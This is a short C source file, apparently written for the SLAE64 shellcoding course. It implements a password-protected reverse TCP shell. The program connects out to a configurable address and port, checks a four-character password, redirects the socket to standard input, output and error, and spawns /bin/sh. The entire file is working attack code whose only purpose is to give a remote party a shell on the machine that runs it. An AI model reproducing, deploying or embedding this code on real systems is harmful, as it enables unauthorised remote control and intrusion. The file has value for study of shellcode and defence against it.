// Filename: ReverseShellTcp.c
// Author:   SLAE64 - 1525
// 
// Purpose: spawn /bin/sh on reverse connect

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

// Define address and port
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 3333
#define PASSWORD "abcd"

int main(int argc, char *argv[])
{
    // Build required structure
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    // Connects
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    char password[32];
    if(recv(s, password, 32, 0) < 0) {
        close(s); 
        exit(1); 
    }

    if (strncmp(PASSWORD, password, 4) != 0) {
        close(s); 
        exit(1); 
    }

    // Duplicate file descriptor
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // Bind the shell to the connection via file descriptors
    execve("/bin/sh", 0, 0);
    return 0;
}